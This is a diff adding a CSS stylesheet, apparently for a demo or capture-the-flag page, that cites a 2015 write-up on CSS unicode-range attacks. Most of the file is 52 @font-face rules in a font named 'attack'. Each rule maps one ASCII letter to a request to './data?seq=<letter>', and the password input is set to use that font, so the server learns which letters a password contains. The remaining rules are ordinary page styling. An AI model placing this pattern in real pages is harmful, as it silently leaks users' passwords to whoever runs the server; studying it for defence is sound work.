@@ -1,0 +1,303 @@
+* {
+  box-sizing: border-box;
+}
+
+/* https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html */
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=A');
+  unicode-range: U+0041;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=B');
+  unicode-range: U+0042;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=C');
+  unicode-range: U+0043;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=D');
+  unicode-range: U+0044;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=E');
+  unicode-range: U+0045;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=F');
+  unicode-range: U+0046;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=G');
+  unicode-range: U+0047;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=H');
+  unicode-range: U+0048;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=I');
+  unicode-range: U+0049;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=J');
+  unicode-range: U+004A;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=K');
+  unicode-range: U+004B;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=L');
+  unicode-range: U+004C;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=M');
+  unicode-range: U+004D;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=N');
+  unicode-range: U+004E;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=O');
+  unicode-range: U+004F;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=P');
+  unicode-range: U+0050;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=Q');
+  unicode-range: U+0051;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=R');
+  unicode-range: U+0052;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=S');
+  unicode-range: U+0053;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=T');
+  unicode-range: U+0054;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=U');
+  unicode-range: U+0055;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=V');
+  unicode-range: U+0056;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=W');
+  unicode-range: U+0057;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=X');
+  unicode-range: U+0058;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=Y');
+  unicode-range: U+0059;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=Z');
+  unicode-range: U+005A;
+}
+
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=a');
+  unicode-range: U+0061;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=b');
+  unicode-range: U+0062;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=c');
+  unicode-range: U+0063;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=d');
+  unicode-range: U+0064;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=e');
+  unicode-range: U+0065;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=f');
+  unicode-range: U+0066;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=g');
+  unicode-range: U+0067;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=h');
+  unicode-range: U+0068;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=i');
+  unicode-range: U+0069;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=j');
+  unicode-range: U+006A;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=k');
+  unicode-range: U+006B;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=l');
+  unicode-range: U+006C;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=m');
+  unicode-range: U+006D;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=n');
+  unicode-range: U+006E;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=o');
+  unicode-range: U+006F;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=p');
+  unicode-range: U+0070;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=q');
+  unicode-range: U+0071;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=r');
+  unicode-range: U+0072;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=s');
+  unicode-range: U+0073;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=t');
+  unicode-range: U+0074;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=u');
+  unicode-range: U+0075;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=v');
+  unicode-range: U+0076;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=w');
+  unicode-range: U+0077;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=x');
+  unicode-range: U+0078;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=y');
+  unicode-range: U+0079;
+}
+@font-face {
+  font-family: attack;
+  src: url('./data?seq=z');
+  unicode-range: U+007A;
+}
+
+html,
+body {
+  margin: 0;
+  padding: 0;
+  background: black;
+  color: lime;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
+    Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+}
+a {
+  color: limegreen;
+}
+#main {
+  padding: 1rem;
+}
+#title {
+  margin: 1rem 1rem 0;
+  width: 600px;
+  width: -moz-fit-content;
+  animation: marquee 8s linear infinite alternate;
+}
+@keyframes marquee {
+  0% {
+    transform: translateX(75%);
+  }
+  100% {
+    transform: translateX(0%);
+  }
+}
+
+#password {
+  background: #444;
+  color: white;
+  padding: 0.5rem;
+  font-family: attack;
+}
